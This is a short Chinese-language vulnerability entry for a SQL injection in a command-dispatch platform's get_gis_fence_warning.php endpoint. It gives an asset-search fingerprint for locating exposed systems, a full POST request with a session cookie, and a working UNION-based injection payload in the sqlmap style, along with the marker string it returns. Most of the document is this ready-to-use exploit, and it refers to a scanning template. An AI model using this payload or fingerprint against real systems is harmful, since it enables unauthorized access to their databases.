# 指挥调度平台get_gis_fence_warning存在SQL注入漏洞

- **系统**：指挥调度平台　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`web.body="app/structure/departments.php"`
- **请求**：`POST /api/client/get_gis_fence_warning.php HTTP/1.1`
- **关键头**：`Cookie: PHPSESSID=7d1e1db182a16e0508fda0961e9a0f6d`　`Content-Type: application/x-www-form-urlencoded`　`Content-Length: 138`

**请求体 / payload**
```
usernumber=1' UNION ALL SELECT NULL,NULL,CONCAT(0x7162707a71,IFNULL(CAST(111*111 AS CHAR),0x20),0x7162707671),NULL,NULL,NULL,NULL,NULL-- -
qbpzq12321qbpvq
sqlmap
POST /api/client/get_gis_fence_warning.php HTTP/1.1
Host:
Cookie: PHPSESSID=7d1e1db182a16e0508fda0961e9a0f6d
Content-Type: application/x-www-form-urlencoded
Content-Length: 138
usernumber=1

\[福建科立讯通信-指挥调度平台-get-gis-fence-warning-sql注入.yaml]\(公众号：渗透安全HackTwo>
```

**其他**
- 指挥调度平台get\_gis\_fence\_warning存在SQL注入漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 指挥调度平台